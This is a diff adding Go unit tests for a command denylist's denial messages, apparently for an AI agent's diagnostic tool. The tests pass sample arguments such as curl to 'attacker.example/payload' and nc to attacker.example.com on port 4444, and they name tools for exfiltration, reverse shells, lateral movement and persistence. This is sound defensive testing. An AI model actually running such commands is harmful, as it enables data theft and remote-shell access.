@@ -2700,6 +2700,78 @@ func TestDenyReason(t *testing.T) {
 			t.Errorf("gdbserver: expected message NOT to use generic phrasing; got: %s", msg)
 		}
 	})
+	t.Run("curl and wget return targeted exfiltration message", func(t *testing.T) {
+		// curl and wget are blocked for data exfiltration, not because they are
+		// destructive or privileged. The message must explain the actual risk so
+		// Claude knows to use read-only local network commands instead.
+		for _, cmd := range []string{"curl", "wget"} {
+			msg := denyReason(DefaultDeniedCommands, []string{cmd, "https://attacker.example/payload"})
+			if !strings.Contains(msg, cmd) {
+				t.Errorf("%s: expected message to name the command; got: %s", cmd, msg)
+			}
+			if !strings.Contains(msg, "exfiltrate") {
+				t.Errorf("%s: expected message to mention exfiltration risk; got: %s", cmd, msg)
+			}
+			if strings.Contains(msg, "destructive or privileged") {
+				t.Errorf("%s: expected message NOT to use generic 'destructive or privileged' phrasing; got: %s", cmd, msg)
+			}
+			// Must suggest at least one read-only local network alternative.
+			hasAlternative := strings.Contains(msg, "ss") || strings.Contains(msg, "netstat") || strings.Contains(msg, "/proc/net")
+			if !hasAlternative {
+				t.Errorf("%s: expected message to suggest a read-only network inspection alternative; got: %s", cmd, msg)
+			}
+		}
+	})
+	t.Run("raw TCP/UDP tools return targeted tunneling/reverse-shell message", func(t *testing.T) {
+		// nc, ncat, netcat, and socat are blocked because they can open raw
+		// TCP/UDP connections that tunnel data out or spawn a remote shell.
+		// The message must explain that risk, not use generic phrasing.
+		for _, cmd := range []string{"nc", "ncat", "netcat", "socat"} {
+			msg := denyReason(DefaultDeniedCommands, []string{cmd, "attacker.example.com", "4444"})
+			if !strings.Contains(msg, cmd) {
+				t.Errorf("%s: expected message to name the command; got: %s", cmd, msg)
+			}
+			if !strings.Contains(msg, "tunnel") && !strings.Contains(msg, "remote shell") {
+				t.Errorf("%s: expected message to mention tunneling or remote shell risk; got: %s", cmd, msg)
+			}
+			if strings.Contains(msg, "destructive or privileged") {
+				t.Errorf("%s: expected message NOT to use generic phrasing; got: %s", cmd, msg)
+			}
+		}
+	})
+	t.Run("remote transfer tools return targeted lateral-movement message", func(t *testing.T) {
+		// ssh, scp, sftp, rsync, ftp, and lftp are blocked for exfiltration and
+		// lateral movement, not because they are destructive. The message must
+		// explain the actual risk.
+		for _, cmd := range []string{"ssh", "scp", "sftp", "rsync", "ftp", "lftp"} {
+			msg := denyReason(DefaultDeniedCommands, []string{cmd, "user@remote.example.com"})
+			if !strings.Contains(msg, cmd) {
+				t.Errorf("%s: expected message to name the command; got: %s", cmd, msg)
+			}
+			if !strings.Contains(msg, "exfiltrate") && !strings.Contains(msg, "lateral movement") {
+				t.Errorf("%s: expected message to mention exfiltration or lateral movement; got: %s", cmd, msg)
+			}
+			if strings.Contains(msg, "destructive or privileged") {
+				t.Errorf("%s: expected message NOT to use generic phrasing; got: %s", cmd, msg)
+			}
+		}
+	})
+	t.Run("at and batch return targeted persistence message", func(t *testing.T) {
+		// at and batch are blocked because they schedule commands that persist
+		// after the diagnostic session ends. The message must explain that risk.
+		for _, cmd := range []string{"at", "batch"} {
+			msg := denyReason(DefaultDeniedCommands, []string{cmd, "now+1min"})
+			if !strings.Contains(msg, cmd) {
+				t.Errorf("%s: expected message to name the command; got: %s", cmd, msg)
+			}
+			if !strings.Contains(msg, "sched") && !strings.Contains(msg, "persist") {
+				t.Errorf("%s: expected message to mention scheduling or persistence risk; got: %s", cmd, msg)
+			}
+			if strings.Contains(msg, "destructive or privileged") {
+				t.Errorf("%s: expected message NOT to use generic phrasing; got: %s", cmd, msg)
+			}
+		}
+	})
 	t.Run("shells return targeted -c bypass message", func(t *testing.T) {
 		// Shells (bash, sh, zsh, etc.) are blocked because they accept a -c flag
 		// to execute arbitrary commands, bypassing the denylist. The message must
